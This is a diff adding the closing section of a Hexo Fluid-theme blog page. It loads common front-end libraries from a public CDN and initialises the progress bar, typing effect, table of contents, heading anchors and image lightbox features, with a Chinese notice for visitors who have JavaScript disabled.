+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
